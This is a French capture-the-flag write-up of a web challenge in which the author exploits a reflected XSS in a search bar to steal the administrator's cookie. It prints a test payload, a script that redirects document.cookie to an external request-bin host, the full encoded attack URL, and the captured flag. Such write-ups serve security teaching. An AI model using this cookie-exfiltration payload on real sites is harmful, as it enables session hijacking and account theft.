# Random Search
<img src="https://media.discordapp.net/attachments/768928242467340328/840138995673071616/unknown.png"/><br/>
Challenge web super basique, on doit trouver un moyen de voler le cookie de l'administrateur.<br/>
## Résolution
En visitant le site qui nous est donné, je vois deux points intéressants.<br/><br/>
<img src="https://media.discordapp.net/attachments/768928242467340328/840139522376335370/unknown.png?width=1440&height=550"/>
On a un contexte d'XSS plutôt récurrent où on peut contacter l'administrateur.<br/>
On a notamment un searchbar à notre disposition. Je décide m'attaquer dessus.<br/>
Premièrement je teste cette payload ```<svg/onload=prompt();>```.<br/><br/>
<img src="https://media.discordapp.net/attachments/768928242467340328/840140153799311380/unknown.png?width=1440&height=470"/>
Le searchbar est vulnérable aux attaques XSS. On a donc notre point d'injection.<br/>
En premier temps je crée un requestbin sur https://pipedream.com/ <br/>
Cette payload est une redirection vers mon pipedream.<br/><br/>
```<script>document.location="https://enx36kg9aihcldt.m.pipedream.net?cookie="+document.cookie;</script>```<br/><br/>
Je pose la payload dans le paramètre search.<br/><br/>
```http://challenges2.france-cybersecurity-challenge.fr:5001/index.php?search=%3Cscript%3Edocument.location%3D%22https%3A%2F%2Fenx36kg9aihcldt.m.pipedream.net%3Fcookie%3D%22%2Bdocument.cookie%3B%3C%2Fscript%3E```<br/><br/>
J'envoie ce lien dans le contact et après quelques minutes j'ai un retour sur mon pipedream.<br/>
Et hop je vois le flag dans le header cookie.<br/><br/>
```?cookie=admin=FCSC{4e0451cc88a9a96e7e46947461382008d8c8f4304373b8907964675c27d7c633}```
